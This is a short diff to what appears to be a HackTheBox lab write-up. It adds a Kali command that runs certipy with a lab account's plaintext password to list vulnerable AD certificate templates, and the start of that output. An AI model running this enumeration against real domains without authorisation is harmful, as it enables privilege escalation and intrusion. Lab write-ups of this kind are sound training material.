@@ -195,7 +195,10 @@ Verbose: Performing the operation "Set-ADAccountPassword" on target "CN=operator
 ```
 
 ## 2. certipy check
-```
+```bash
+┌──(kali㉿kali)-[~/Desktop/htb]
+└─$ certipy find -u 'CA_operator' -p 'Passw0rd' -dc-ip 10.129.124.89 -vulnerable -stdout
+
 Certificate Templates
   0
     Template Name                       : CertifiedAuthentication
